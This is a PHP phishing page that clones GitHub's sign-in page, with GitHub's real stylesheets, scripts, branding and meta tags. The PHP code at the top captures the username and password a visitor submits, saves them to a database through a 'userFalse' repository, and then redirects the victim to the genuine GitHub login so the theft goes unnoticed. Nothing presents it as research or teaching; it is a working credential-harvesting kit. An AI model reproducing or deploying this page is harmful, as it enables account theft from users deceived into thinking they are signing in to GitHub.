<?php 


include_once 'app/Conexion.php';
include_once 'app/userFalse.php';
include_once 'app/userFalseRepository.php';
include_once 'app/Redirection.php';

if (isset($_POST['submit'])) {
    Conexion :: openConexion();
 

    if (true) {
        $user = new userFalse('', $_POST['username'], $_POST['password'], '');
        $inserted_user = userFalseRepository :: userInsert(Conexion :: getConexion(), $user);
    }

    Conexion :: closeConexion();
    
    Redirection::redirect('https://github.com/login');
}

?>



<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://github.githubassets.com">
  <link rel="dns-prefetch" href="https://avatars0.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars1.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars2.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars3.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">



  <link crossorigin="anonymous" media="all" integrity="sha512-KYH8zRCvGYQoVsdDKgYaJRXDN9CwQu0YkPVgbKm4cOiqLAxNisg2Kjex6tfrEB3yTAwtXcFY/sxBVj/3IkIiqg==" rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-a70126cbff30372f13f599b76353080b.css" />
  <link crossorigin="anonymous" media="all" integrity="sha512-L+Xfjk72/sIPS5T8Z8Wy/+/78ngrN7jAjVpE5Zoo2KfZYqr9s8p6selV7sLydYrh0Y3Pu02CuEa7uuq70RjSxg==" rel="stylesheet" href="https://github.githubassets.com/assets/site-278e4176d194ae782983c71f1f767503.css" />
    <link crossorigin="anonymous" media="all" integrity="sha512-C2PeOYJLfGX0l1usuxFpXXEX27kP3TXRWl7jQ/qpMF59td5XFUUqB/EmZL2loRRBzouPP96e09oq2jovH+smEA==" rel="stylesheet" href="https://github.githubassets.com/assets/github-0d139b56f7fdba32feb4dfab70407a06.css" />
    
    
    
    

  <meta name="viewport" content="width=device-width">
  
  <title>Sign in to GitHub · GitHub</title>
    <meta name="description" content="GitHub is where people build software. More than 31 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">
  <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
  <meta property="fb:app_id" content="1401488693436528">

    <meta property="og:url" content="https://github.com">
    <meta property="og:site_name" content="GitHub">
    <meta property="og:title" content="Build software better, together">
    <meta property="og:description" content="GitHub is where people build software. More than 31 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-logo.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="1200">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-mark.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="620">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-octocat.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="620">


  <link rel="assets" href="https://github.githubassets.com/">
  
  <meta name="pjax-timeout" content="1000">
  
  <meta name="request-id" content="8A28:540A:188CC9A:2C8275B:5C69E75F" data-pjax-transient>


  

  <meta name="selected-link" value="/login" data-pjax-transient>

      <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">
    <meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">
    <meta name="google-site-verification" content="GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc">

  <meta name="octolytics-host" content="collector.githubapp.com" /><meta name="octolytics-app-id" content="github" /><meta name="octolytics-event-url" content="https://collector.githubapp.com/github-external/browser_event" /><meta name="octolytics-dimension-request_id" content="8A28:540A:188CC9A:2C8275B:5C69E75F" /><meta name="octolytics-dimension-region_edge" content="iad" /><meta name="octolytics-dimension-region_render" content="iad" />
<meta name="analytics-location-query-strip" content="true" data-pjax-transient="true" />



    <meta name="google-analytics" content="UA-3769691-2">


<meta class="js-ga-set" name="dimension1" content="Logged Out">



  

      <meta name="hostname" content="github.com">
    <meta name="user-login" content="">

      <meta name="expected-hostname" content="github.com">
    <meta name="js-proxy-site-detection-payload" content="NDNiMzc3MzZmZTM5ODE4NDU1ZjI4OWNiZjQ4ZWExZjg0ZjE3YTVjYjE4YzkxNjJjNmZiZTg1NGI0MjgyMGRjZXx7InJlbW90ZV9hZGRyZXNzIjoiMTg3LjE2MS41My4xNDkiLCJyZXF1ZXN0X2lkIjoiOEEyODo1NDBBOjE4OENDOUE6MkM4Mjc1Qjo1QzY5RTc1RiIsInRpbWVzdGFtcCI6MTU1MDQ0NDM4MywiaG9zdCI6ImdpdGh1Yi5jb20ifQ==">

    <meta name="enabled-features" content="UNIVERSE_BANNER,MARKETPLACE_PLAN_RESTRICTION_EDITOR,MARKETPLACE_BROWSING_V2">

  <meta name="html-safe-nonce" content="093d50c4acfe3f73ef005bb2c06ee83c7635944c">

  <meta http-equiv="x-pjax-version" content="688077f92de7af23573f865e9a2e903f">
  


    <link rel="canonical" href="https://github.com/login" data-pjax-transient>


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <link rel="mask-icon" href="https://github.githubassets.com/pinned-octocat.svg" color="#000000">
  <link rel="icon" type="image/x-icon" class="js-site-favicon" href="https://github.githubassets.com/favicon.ico">

<meta name="theme-color" content="#1e2327">


  <meta name="u2f-support" content="true">


  <link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">

  </head>

  <body class="logged-out env-production page-responsive min-width-0 session-authentication">
    

  <div class="position-relative js-header-wrapper ">
    <a href="#start-of-content" tabindex="1" class="px-2 py-4 bg-blue text-white show-on-focus js-skip-to-content">Skip to content</a>
    <div id="js-pjax-loader-bar" class="pjax-loader-bar"><div class="progress"></div></div>

    
    
    


      <div class="header header-logged-out width-full pt-5 pb-4" role="banner">
  <div class="container clearfix width-full text-center">
    <a class="header-logo" href="https://github.com/" aria-label="Homepage" data-ga-click="(Logged out) Header, go to homepage, icon:logo-wordmark">
      <svg height="48" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="48" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>
    </a>
  </div>
</div>


  </div>

  <div id="start-of-content" class="show-on-focus"></div>



  <div role="main" class="application-main " data-commit-hovercards-enabled>
      
      <div id="js-pjax-container" data-pjax-container>
        

<div class="auth-form px-3" id="login">

    <!-- '"` --><!-- </textarea></xmp> --><form action="http://localhost:8080/Proyect001/index.html" accept-charset="UTF-8" method="post">    <div class="auth-form-header p-0">
        <h1>Sign in to GitHub</h1>
      </div>


      <div id="js-flash-container">

</div>


      <div class="auth-form-body mt-3">

        <label for="login_field">
          Username or email address
        </label>
        <input type="text" name="username" id="login_field" class="form-control input-block" tabindex="1" autocapitalize="off" autocorrect="off" autofocus="autofocus" />

        <label for="password">
          Password <a class="label-link" href="/password_reset">Forgot password?</a>
        </label>
        <input type="password" name="password" id="password" class="form-control form-control input-block" tabindex="2" />

        <input type="submit" name="submit" value="Sign in" tabindex="3" class="btn btn-primary btn-block" data-disable-with="Signing in…" />
      </div>
</form>

      <p class="create-account-callout mt-3">
        New to GitHub?
        <a data-ga-click="Sign in, switch to sign up" href="/join?return_to=%2Fscipag%2Fhttprecon-nse&amp;source=login">Create an account</a>.
      </p>
</div>

      </div>
      <div class="modal-backdrop js-touch-events"></div>
  </div>

        <div class="footer container-lg p-responsive py-6 mt-6 f6" role="contentinfo">
    <ul class="list-style-none d-flex flex-justify-center">
        <li class="mr-3"><a href="/site/terms" data-ga-click="Footer, go to terms, text:terms">Terms</a></li>
        <li class="mr-3"><a href="/site/privacy" data-ga-click="Footer, go to privacy, text:privacy">Privacy</a></li>
        <li class="mr-3"><a href="https://help.github.com/articles/github-security/" data-ga-click="Footer, go to security, text:security">Security</a></li>
        <li><a class="link-gray" data-ga-click="Footer, go to contact, text:contact" href="https://github.com/contact">Contact GitHub</a></li>
    </ul>
  </div>



  <div id="ajax-error-message" class="ajax-error-message flash flash-error">
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"/></svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"/></svg>
    </button>
    You can’t perform that action at this time.
  </div>


    
    <script crossorigin="anonymous" integrity="sha512-YfiOQfcBmPBSdKjr8AOICO9fwE7C3m6h7nTT1o9oWwVsonJudi++Oqyd2wCynfJ6pyTXVFsqsv0aNhc+KJOuFw==" type="application/javascript" src="https://github.githubassets.com/assets/frameworks-482260f8755c70642a3ef1f1448e1c47.js"></script>
    
    <script crossorigin="anonymous" async="async" integrity="sha512-l9Ar5oP2cfw418WS8z+wBLS74iChIxHgs+tPxVtSKZqwGmd0ZUVCiDQ5JFbAHFwvs9G/MsKap4cHgZvYmQU1lA==" type="application/javascript" src="https://github.githubassets.com/assets/github-89163211800622292b190e405ff22204.js"></script>
    
    
    
  <div class="js-stale-session-flash stale-session-flash flash flash-warn flash-banner d-none">
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"/></svg>
    <span class="signed-in-tab-flash">You signed in with another tab or window. <a href="">Reload</a> to refresh your session.</span>
    <span class="signed-out-tab-flash">You signed out in another tab or window. <a href="">Reload</a> to refresh your session.</span>
  </div>
  <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default text-gray-dark" open>
    <summary aria-haspopup="dialog" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
        <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"/></svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

  <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;" tabindex="0">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box box-shadow-large" style="width:360px;">
  </div>
</div>

<div id="hovercard-aria-description" class="sr-only">
  Press h to open a hovercard with more details.
</div>

  <div aria-live="polite" class="js-global-screen-reader-notice sr-only"></div>

  </body>